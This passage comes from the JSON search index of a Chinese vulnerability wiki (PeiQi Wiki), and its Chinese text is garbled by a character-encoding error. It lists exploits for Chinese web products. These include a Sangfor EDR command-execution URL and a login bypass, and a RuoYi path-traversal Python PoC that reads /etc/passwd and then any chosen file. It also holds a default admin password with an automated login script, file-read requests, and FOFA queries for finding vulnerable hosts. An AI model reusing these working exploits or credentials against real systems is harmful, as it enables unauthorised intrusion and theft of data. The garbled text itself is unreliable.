è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä½¿ç”¨ä¸EDRç›¸åŒæ¨¡æ¿å’Œéƒ¨åˆ†æ–‡ä»¶å¯¼è‡´å‘½ä»¤æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] æ·±ä¿¡æœ è¡Œä¸ºæ„ŸçŸ¥ç³»ç»Ÿ FOFA [!NOTE] body=\"isHighPerformance : !!SFIsHighPerformance,\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ è®¿é—®æ¼æ´Url /tool/log/c.php?strip_slashes=system&host=ipconfig PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 19:53:51 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœåå°ä»»æ„ç”¨æˆ·ç™»é™†æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœåå°ä»»æ„ç”¨æˆ·ç™»é™†æ¼æ´.html","title":"æ·±ä¿¡æœåå°ä»»æ„ç”¨æˆ·ç™»é™†æ¼æ´","keywords":"","body":"æ·±ä¿¡æœåå°ä»»æ„ç”¨æˆ·ç™»é™†æ¼æ´ æ¼æ´æè¿° æ·±ä¿¡æœç»ˆç«¯æ£€æµ‹å“åº”å¹³å°æ˜¯æ·±ä¿¡æœå…¬å¸å¼€å‘çš„ä¸€å¥—EDRç³»ç»Ÿã€‚æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œç™»å½•ä»»æ„ç”¨æˆ· å½±å“ç‰ˆæœ¬ [!NOTE] EDR æ¼æ´å¤ç° https://xxx.xxx.xxx.xxx/ui/login.php?user=admin [!NOTE] æ³¨æ„æœ€åçš„adminéœ€è¦ä¸ºå­˜åœ¨çš„ç”¨æˆ·å PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/è‹¥ä¾ç®¡ç†ç³»ç»Ÿ/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/è‹¥ä¾ç®¡ç†ç³»ç»Ÿ/","title":"è‹¥ä¾(RuoYi)ç®¡ç†ç³»ç»Ÿ","keywords":"","body":"è‹¥ä¾(RuoYi)ç®¡ç†ç³»ç»Ÿ è‹¥ä¾ç®¡ç†ç³»ç»Ÿ åå°ä»»æ„æ–‡ä»¶è¯»å– CNVD-2021-01931 è‹¥ä¾ç®¡ç†ç³»ç»Ÿ æœªæˆæƒè®¿é—® PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-20 23:18:01 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/è‹¥ä¾ç®¡ç†ç³»ç»Ÿ/è‹¥ä¾ç®¡ç†ç³»ç»Ÿ åå°ä»»æ„æ–‡ä»¶è¯»å– CNVD-2021-01931.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/è‹¥ä¾ç®¡ç†ç³»ç»Ÿ/è‹¥ä¾ç®¡ç†ç³»ç»Ÿ åå°ä»»æ„æ–‡ä»¶è¯»å– CNVD-2021-01931.html","title":"è‹¥ä¾ç®¡ç†ç³»ç»Ÿ åå°ä»»æ„æ–‡ä»¶è¯»å– CNVD-2021-01931","keywords":"","body":"è‹¥ä¾(RuoYi)ç®¡ç†ç³»ç»Ÿ åå°ä»»æ„æ–‡ä»¶è¯»å– æ¼æ´æè¿° è‹¥ä¾ç®¡ç†ç³»ç»Ÿæ˜¯åŸºäºSpringBootçš„æƒé™ç®¡ç†ç³»ç»Ÿ,ç™»å½•åå°åå¯ä»¥è¯»å–æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] RuoYi FOFA [!NOTE] app=\"è‹¥ä¾-ç®¡ç†ç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»å½•åå°åè®¿é—® Url https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd è®¿é—®åä¼šä¸‹è½½æ–‡ä»¶ /etc/passwd å¯ä»¥ä½¿ç”¨BurpæŠ“åŒ…æ”¹å˜ /etc/passwd ä¸ºå…¶ä»–æ–‡ä»¶è·¯å¾„è·å–æ•æ„Ÿä¿¡æ¯ åœ¨æ–°ç‰ˆæœ¬çš„ä¿®å¤ä¸­æ·»åŠ äº†è¿‡æ»¤ æ¼æ´åˆ©ç”¨POC [!NOTE] POCä½¿ç”¨éœ€è¦åå°çš„Cookie,è¯»å–çš„æ–‡ä»¶è·¯å¾„åº”ä¸ºæ ¹è·¯å¾„ import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: RuoYi >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> JSESSIONID=xxxxxx \\033[0m') print('+ \\033[36mFile >>> /etc/passwd \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":Cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ {}//common/download/resource?resource=/profile/../../../../etc/passwd \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æˆåŠŸè¯»å– /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) while True: Filename = input(\"\\033[35mFile >>> \\033[0m\") if Filename == \"exit\": sys.exit(0) else: POC_2(target_url, Cookie, Filename) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, Cookie, Filename): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../{}\".format(Filename) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":Cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = str(input(\"\\033[35mCookie >>> \\033[0m\")) POC_1(target_url, Cookie) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/è‹¥ä¾ç®¡ç†ç³»ç»Ÿ/è‹¥ä¾ç®¡ç†ç³»ç»Ÿ æœªæˆæƒè®¿é—®.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/è‹¥ä¾ç®¡ç†ç³»ç»Ÿ/è‹¥ä¾ç®¡ç†ç³»ç»Ÿ æœªæˆæƒè®¿é—®.html","title":"è‹¥ä¾ç®¡ç†ç³»ç»Ÿ æœªæˆæƒè®¿é—®","keywords":"","body":"è‹¥ä¾ç®¡ç†ç³»ç»Ÿ æœªæˆæƒè®¿é—® æ¼æ´æè¿° è‹¥ä¾ç®¡ç†ç³»ç»Ÿä½¿ç”¨äº†Druid é»˜è®¤å¼€å¯äº†åŒ¿åè®¿é—®ï¼Œå¯¼è‡´æœªæˆæƒè·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] è‹¥ä¾ç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] app=\"è‹¥ä¾-ç®¡ç†ç³»ç»Ÿ\" æ¼æ´å¤ç° æºç ä¸­çœ‹åˆ° pom.xml æ–‡ä»¶ä¸­æŸ¥çœ‹åˆ°å¼•ç”¨äº† é˜¿é‡ŒDruid ä» issues ä¸­å‘ç°äº†é»˜è®¤å­˜åœ¨çš„æœªæˆæƒè®¿é—® Urlä¸º http://xxx.xxx.xxx.xxx/prod-api/druid/index.html Goby & POC [!NOTE] RuoYi Druid Unauthorized access PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ/","title":"æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ","keywords":"","body":"æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-16 09:56:41 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ/æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ/æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html","title":"æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","keywords":"","body":"æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¼æ´æè¿° æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿå‰å°æ³¨å†Œé¡µé¢å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œç”±äºæ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œå®¡æŸ¥å¯¼è‡´å¯ä¸Šä¼ æ¶æ„æ–‡ä»¶æ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] body=\"DC_Login/QYSignUp\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ï¼Œåªè¦å­˜åœ¨ä¼ä¸šç”¨æˆ·æ³¨å†Œå°±å¯èƒ½å‡ºç°æ¼æ´ [!NOTE] è¿™ä¸ªåœ°æ–¹çš„ä¸Šä¼ é™„ä»¶å…è®¸äº†ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ŒåŒ…æ‹¬ aspxæœ¨é©¬ï¼Œä¸Šä¼ åè¿˜ä¼šè¿”å› webshellåœ°å€ ä¸Šä¼ çš„æ˜¯å†°èæœ¨é©¬ï¼Œç›´æ¥è¿æ¥ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­æ–°é‡‘ç›¾/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­æ–°é‡‘ç›¾/","title":"ä¸­æ–°é‡‘ç›¾","keywords":"","body":"ä¸­æ–°é‡‘ç›¾ ä¸­æ–°é‡‘ç›¾ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ é»˜è®¤è¶…çº§ç®¡ç†å‘˜å¯†ç æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-30 21:13:47 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­æ–°é‡‘ç›¾/ä¸­æ–°é‡‘ç›¾ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ é»˜è®¤è¶…çº§ç®¡ç†å‘˜å¯†ç æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¸­æ–°é‡‘ç›¾/ä¸­æ–°é‡‘ç›¾ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ é»˜è®¤è¶…çº§ç®¡ç†å‘˜å¯†ç æ¼æ´.html","title":"ä¸­æ–°é‡‘ç›¾ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ é»˜è®¤è¶…çº§ç®¡ç†å‘˜å¯†ç æ¼æ´","keywords":"","body":"ä¸­æ–°é‡‘ç›¾ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ é»˜è®¤è¶…çº§ç®¡ç†å‘˜å¯†ç æ¼æ´ æ¼æ´æè¿° ä¸­æ–°ç½‘ç»œä¿¡æ¯å®‰å…¨è‚¡ä»½æœ‰é™å…¬å¸ä¸­æ–°é‡‘ç›¾ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿå­˜åœ¨é»˜è®¤å¼±å£ä»¤ï¼Œç™»å½•èº«ä»½ä¸ºè¶…çº§ç®¡ç†å‘˜ ç›®å‰å¤§éƒ¨åˆ†ä½¿ç”¨çš„éƒ½å—åˆ°äº†å½±å“ æ¼æ´å½±å“ [!NOTE] ä¸­æ–°é‡‘ç›¾ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] title=\"ä¸­æ–°é‡‘ç›¾ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ\" æ¼æ´å¤ç° çœ‹åˆ°äº§å“æ‰‹å†Œ ç³»ç»Ÿé»˜è®¤ç®¡ç†å‘˜è´¦å·å¯†ç ï¼š admin/zxsoft1234!@#$ ç™»å½•é¡µé¢å¦‚ä¸Šï¼Œä½¿ç”¨è´¦å·å¯†ç ç™»å½• å…¶ä¸­æ³„éœ²äº†å¤§éƒ¨åˆ†ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬ SMMSä¸FTP åŠç”¨æˆ·ä¿¡æ¯ æ¼æ´åˆ©ç”¨POC [!NOTE] è¯·æ±‚ ?q=common/getcode æ—¶ è¿”å›äº†éªŒè¯ç ï¼Œé€šè¿‡éªŒè¯ç å¯çˆ†ç ´è´¦å·å¯†ç ç­‰æ“ä½œ import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: ä¸­æ–°é‡‘ç›¾ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿ é»˜è®¤è¶…çº§ç®¡ç†å‘˜å¯†ç æ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"?q=common/getcode\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è·å–éªŒè¯ç  {}?q=common/getcode ..... \\033[0m\".format(target_url)) response_data = response.headers['Set-Cookie'] check_code = re.findall(r'check_code=(.*?);', response_data)[0] PHPSESSID = re.findall(r'PHPSESSID=(.*?);', response_data)[0] print(\"\\033[36m[o] éªŒè¯ç :{}\\n[o] PHPSESSID:{} \\033[0m\".format(check_code, PHPSESSID)) POC_2(target_url, check_code, PHPSESSID) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, check_code, PHPSESSID): vuln_url = target_url + \"?q=common/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"PHPSESSID={}; check_code={}\".format(PHPSESSID, check_code), \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\" } data = \"name=admin&password=zxsoft1234!%40%23%24&checkcode={}&doLoginSubmit=1\".format(check_code) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"1\" in response.text and response.status_code == 200: print(\"\\033[36m[o] ç›®æ ‡ {} å­˜åœ¨é»˜è®¤ç®¡ç†å‘˜å¼±å£ä»¤ admin / zxsoft1234!@#$ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨é»˜è®¤ç®¡ç†å‘˜å¼±å£ä»¤ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ ZhongXinJingDun_Default_administrator_password PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å›¾åˆ›è½¯ä»¶/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å›¾åˆ›è½¯ä»¶/","title":"å›¾åˆ›è½¯ä»¶","keywords":"","body":"å›¾åˆ›è½¯ä»¶ å›¾åˆ›è½¯ä»¶ å›¾ä¹¦é¦†ç«™ç¾¤ç®¡ç†ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 23:21:11 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å›¾åˆ›è½¯ä»¶/å›¾åˆ›è½¯ä»¶ å›¾ä¹¦é¦†ç«™ç¾¤ç®¡ç†ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å›¾åˆ›è½¯ä»¶/å›¾åˆ›è½¯ä»¶ å›¾ä¹¦é¦†ç«™ç¾¤ç®¡ç†ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"å›¾åˆ›è½¯ä»¶ å›¾ä¹¦é¦†ç«™ç¾¤ç®¡ç†ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"å›¾åˆ›è½¯ä»¶ å›¾ä¹¦é¦†ç«™ç¾¤ç®¡ç†ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° å›¾åˆ›è½¯ä»¶ å›¾ä¹¦é¦†ç«™ç¾¤ç®¡ç†ç³»ç»Ÿ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] å›¾åˆ›è½¯ä»¶ å›¾ä¹¦é¦†ç«™ç¾¤ç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] \"å¹¿å·å›¾åˆ›\" && country=\"CN\" && body=\"/interlib/common/\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´è¯·æ±‚åŒ…ä¸º GET /interlib/report/ShowImage?localPath=C:\\Windows\\system.ini HTTP/1.1 Host: Content-Length: 4 æˆåŠŸè¯»å– system.ini æ–‡ä»¶ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 23:47:50 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¹…å…¶è½¯ä»¶/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¹…å…¶è½¯ä»¶/","title":"ä¹…å…¶è½¯ä»¶","keywords":"","body":"ä¹…å…¶è½¯ä»¶ ä¹…å…¶è´¢åŠ¡æŠ¥è¡¨ download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-07 21:10:45 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¹…å…¶è½¯ä»¶/ä¹…å…¶è´¢åŠ¡æŠ¥è¡¨ download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ä¹…å…¶è½¯ä»¶/ä¹…å…¶è´¢åŠ¡æŠ¥è¡¨ download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"ä¹…å…¶è´¢åŠ¡æŠ¥è¡¨ download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"ä¹…å…¶è´¢åŠ¡æŠ¥è¡¨ download.jsp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° ä¹…å…¶è´¢åŠ¡æŠ¥è¡¨ download.jsp å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–æœåŠ¡å™¨ä¸Šçš„ä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] ä¹…å…¶è´¢åŠ¡æŠ¥è¡¨ FOFA [!NOTE] body=\"/netrep/\" æ¼æ´å¤ç° ç™»å½•è·¯å¾„å¦‚ä¸‹ å‘é€è¯·æ±‚åŒ… POST /netrep/ebook/browse/download.jsp HTTP/1.1 Host: Content-Length: 55 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://114.251.113.53:7002 Content-Type: application/x-www-form-urlencoded jpgfilepath=c:\\windows\\win.ini PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 14:07:24 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¿ƒç†æµ‹é‡å¹³å°/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¿ƒç†æµ‹é‡å¹³å°/","title":"å¿ƒç†æµ‹é‡å¹³å°","keywords":"","body":"å¿ƒç†æµ‹é‡å¹³å° å®‰å¾½é˜³å…‰å¿ƒå¥ å¿ƒç†æµ‹é‡å¹³å° ç›®å½•éå†æ¼æ´ CNVD-2021-01929 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-16 13:10:51 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¿ƒç†æµ‹é‡å¹³å°/å®‰å¾½é˜³å…‰å¿ƒå¥ å¿ƒç†æµ‹é‡å¹³å° ç›®å½•éå†æ¼æ´ CNVD-2021-01929.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¿ƒç†æµ‹é‡å¹³å°/å®‰å¾½é˜³å…‰å¿ƒå¥ å¿ƒç†æµ‹é‡å¹³å° ç›®å½•éå†æ¼æ´ CNVD-2021-01929.html","title":"å®‰å¾½é˜³å…‰å¿ƒå¥ å¿ƒç†æµ‹é‡å¹³å° ç›®å½•éå†æ¼æ´ CNVD-2021-01929","keywords":"","body":"å®‰å¾½é˜³å…‰å¿ƒå¥ å¿ƒç†æµ‹é‡å¹³å° ç›®å½•éå†æ¼æ´ CNVD-2021-01929 æ¼æ´æè¿° å®‰å¾½é˜³å…‰å¿ƒå¥å¿ƒç†å’¨è¯¢æœ‰é™å…¬å¸å¿ƒç†æµ‹é‡å¹³å°å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è·å–æ•æ„Ÿä¿¡æ¯ã€‚ æ¼æ´å½±å“ [!NOTE] å®‰å¾½é˜³å…‰å¿ƒå¥ å¿ƒç†æµ‹é‡å¹³å° FOFA [!NOTE] icon_hash=\"-320896955\" æ¼æ´å¤ç° ä¸»é¡µå¦‚ä¸‹ æ‰«æç›®å½• è®¿é—® http://xxx.xxx.xxx.xxx/admin/ å…¶ä¸­ http://xxx.xxx.xxx.xxx/admin/UserFiles/ ä¸­è¿˜åŒ…å«äº†ç”¨æˆ·ä¿¡æ¯å¯æœªæˆæƒä¸‹è½½ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®è·µæ•™å­¦å¹³å°/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®è·µæ•™å­¦å¹³å°/","title":"å®è·µæ•™å­¦å¹³å°","keywords":"","body":"å®è·µæ•™å­¦å¹³å° æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´ æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ åå°XSSæ¼æ´ æ­å·æ³•æºè½¯ä»¶ å…¬è¯å®åŠ¡æ•™å­¦è½¯ä»¶ SQLæ³¨å…¥æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-03 10:24:31 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®è·µæ•™å­¦å¹³å°/æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®è·µæ•™å­¦å¹³å°/æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´.html","title":"æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´","keywords":"","body":"æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° æ­å·æ³•æºè½¯ä»¶å¼€å‘æœ‰é™å…¬å¸å¼€å‘çš„å®è·µæ•™å­¦å¹³å°ç³»ç»Ÿä¸‹çš„æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿç™»å½•å‰å°å­˜åœ¨é€šç”¨SQLiæ¼æ´ æ¼æ´å½±å“ [!NOTE] æ­å·æ³•æºè½¯ä»¶ æ³•å¾‹çŸ¥è¯†æ•°æ®åº“ç³»ç»Ÿ FOFA [!NOTE] icon_hash=\"2018105215\" || title=\"å®è·µæ•™å­¦å¹³å° - æ­å·æ³•æºè½¯ä»¶å¼€å‘æœ‰é™å…¬å¸\" æ¼æ´å¤ç° è¿›å…¥é¡µé¢å¦‚ä¸‹ å‡ºç°æ¼æ´çš„Urlä¸º http://xxxxxxx/JusRepos/ui/login.aspx æŠ“å–ç™»å½•çš„è¯·æ±‚åŒ… POST /JusRepos/ui/login.aspx HTTP/1.1 Host: xxx.xxx.xxx.xxxx Content-Length: 362 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: 